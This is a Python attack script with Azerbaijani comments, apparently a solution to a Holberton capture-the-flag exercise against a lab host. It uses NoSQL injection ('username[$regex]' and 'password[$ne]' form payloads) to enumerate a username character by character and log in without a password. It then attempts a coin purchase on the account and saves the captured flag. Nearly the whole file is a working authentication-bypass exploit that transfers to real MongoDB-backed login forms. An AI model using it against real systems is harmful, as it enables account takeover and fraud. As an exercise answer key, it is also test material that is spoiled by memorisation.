import requests
import string
from bs4 import BeautifulSoup

# Hədəf URL
url = "http://web0x01.hbtn/a3/nosql_injection"

# Sessiyanı qorumaq üçün (Cookie-lər və s.)
s = requests.Session()

def get_username():
    """
    İstifadəçi adını NoSQL Regex inyeksiyası ilə tapır.
    """
    print("[*] İstifadəçi adları axtarılır (Enumerating)...")
    found_username = ""
    # Axtarış üçün simvollar: hərflər, rəqəmlər və bəzi simvollar
    chars = string.ascii_letters + string.digits + ".-_"
    
    while True:
        found_char = False
        for char in chars:
            test_username = found_username + char
            # Payload: istifadəçi adı 'test_username' ilə başlayırmı?
            # PHP/MongoDB mühitləri üçün form-data inyeksiyası
            payload = {
                "username[$regex]": f"^{test_username}",
                "password[$ne]": ""
            }
            
            # Redirect-ləri izləmə ki, statusu görə bilək (allow_redirects=False)
            r = s.post(url, data=payload, allow_redirects=False)
            
            # Əgər sistem bizi yönləndirirsə (302 Found), deməli giriş uğurludur
            if r.status_code == 302:
                found_username += char
                print(f"[+] Tapılan hissə: {found_username}")
                found_char = True
                break
        
        if not found_char:
            break
            
    return found_username

def check_balance_and_buy(username):
    """
    Tapılan istifadəçi ilə giriş edir, balansı yoxlayır və HBTNc alır.
    """
    print(f"\n[*] '{username}' istifadəçisi yoxlanılır...")
    
    # Dəqiq istifadəçi adı ilə giriş edirik
    login_payload = {
        "username": username,
        "password[$ne]": ""
    }
    
    r = s.post(url, data=login_payload)
    
    # Səhifənin içində balansı axtarırıq (BeautifulSoup ilə parsing)
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # QEYD: Buradakı HTML elementləri saytın strukturuna görə dəyişə bilər.
    # Adətən balans <div id="balance"> və ya bənzər yerdə olur.
    # Məsələn, bütün mətni yoxlayaq:
    page_text = soup.get_text()
    
    print("[*] Səhifə analizi edilir...")
    
    # Əgər hesabda pul varsa (sadə məntiq)
    # Burada real mühitdə HTML-ə baxıb dəqiq sahəni tapmaq lazımdır.
    # Biz birbaşa Exchange əməliyyatını sınayaq, onsuz da pul yoxdursa alınmayacaq.
    
    print("[*] HBTNc almağa cəhd edilir...")
    
    # Exchange formunun dəyərləri (HTML formuna əsasən)
    # Adətən bu parametrlər lazımdır:
    exchange_payload = {
        "coin": "HBTNc",
        "amount": "1"  # Ən azı 1 HBTNc lazımdır
    }
    
    # Mübadilə sorğusunu göndəririk (URL eyni ola bilər və ya /exchange ola bilər)
    # Bu tapşırıqda adətən eyni URL-ə POST sorğusu göndərilir
    r_exchange = s.post(url, data=exchange_payload)
    
    if "Flag" in r_exchange.text or "HBTN" in r_exchange.text:
        print("\n[SUCCESS] Flag tapıldı!\n")
        # Flag-i çıxarmaq üçün sadə axtarış
        for line in r_exchange.text.split('\n'):
            if "Flag" in line or "flag" in line:
                print(line.strip())
                # Flag-i fayla yazaq
                with open("7-flag.txt", "w") as f:
                    f.write(line.strip())
        return True
    else:
        print("[-] Bu istifadəçinin balansı yetmədi və ya əməliyyat uğursuz oldu.")
        return False

# Əsas icra hissəsi
if __name__ == "__main__":
    try:
        # 1. Addım: İstifadəçi adını tap
        target_user = get_username()
        
        if target_user:
            print(f"\n[+] Tam istifadəçi adı tapıldı: {target_user}")
            
            # 2. və 3. Addım: Giriş et və al
            check_balance_and_buy(target_user)
        else:
            print("[-] Heç bir istifadəçi adı tapılmadı. Skripti və ya URL-i yoxlayın.")
            
    except Exception as e:
        print(f"[!] Xəta baş verdi: {e}")
